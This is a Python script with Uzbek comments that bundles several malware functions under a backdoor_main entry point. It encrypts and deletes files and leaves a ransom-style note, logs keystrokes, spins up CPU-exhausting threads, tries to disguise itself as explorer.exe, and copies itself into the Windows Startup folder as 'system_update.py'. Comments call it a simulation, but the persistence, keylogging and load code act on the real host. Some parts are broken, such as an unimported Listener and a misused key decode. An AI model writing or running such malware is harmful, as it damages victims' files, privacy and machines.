import os
import threading
import time
import shutil
import psutil
import base64
from cryptography.fernet import Fernet
import sys
import random

# shifrlash kaliti (ransomware simulyatsiyasi)
key = Fernet.generate_key()
cipher = Fernet(key)
# log fayli (klaviatura yozuvlari uchun)
LOG_FILE = "keystores.txt"
def encrypt_file(file_path):
    """fayllarni shifrlash (ransomware simulyatsiyasi)"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path + ".enc", "wb") as f:
            f.write(encrypted_data)
        os.remove(file_path)  # asl faylni o'chirish
        return True
    except:
        return False

def ransomware():
    """barcha fayllarni shifrlash"""
    target_dir = "test_victim" # Sinov faylini saqlash joyi
    if not os.path.exists(target_dir):
        os.mkdir(target_dir)
        with open(os.path.join(target_dir, "example.txt"), "w") as f:
            f.write("bu sinov faylii")
    for root, _, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc"):
                encrypt_file(file_path)
        # fayllarni shifrlash tugagach, foydalanuvchiga xabar berish
    with open("README.txt", "w") as f:
        f.write(f"fayillaringiz shifrlangan! kalit: {base64.b64decode(key).decode()}")

def keylogger():
    """klaviatura bosimlarini yozib olish"""
    def on_press(key):
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.ctime()} - {str(key)}\n")

    with Listener(on_press=on_press) as listener:
        listener.join()

def overload_system():
    """Tizimni qulflash yoki yukini oshirish"""
    def cpu_killer():
        while True:
            random.random() # CPUga yuklama

    for _ in range(10):
        threading.Thread(target=cpu_killer, daemon=True).start()

def hide_process():
    """Jarayonni yashirish"""
    try:
        psutil.Process().name = "explorer.exe" # Windowsda odatiy jarayon kabi ko'rinish
    except:
        pass

def persistence():
    """Tizim qayta ishga tushganda jarayonni doimiy ravishda ishga tushirish"""
    if os.name == 'nt': # Windows
        script_path = os.path.abspath(__file__)
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy(script_path, startup_path + "\\system_update.py")

def backdoor_main():
    """Asosiy funktsiya"""
    hide_process()
    persistence()

    threading.Thread(target=ransomware, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=overload_system, daemon=True).start()
    # Foydalanuvchiga yashirinish uchun interfey ko'rsatmaydi
    while True:
        time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=backdoor_main, daemon=True).start()
    while True:
        time.sleep(1000)
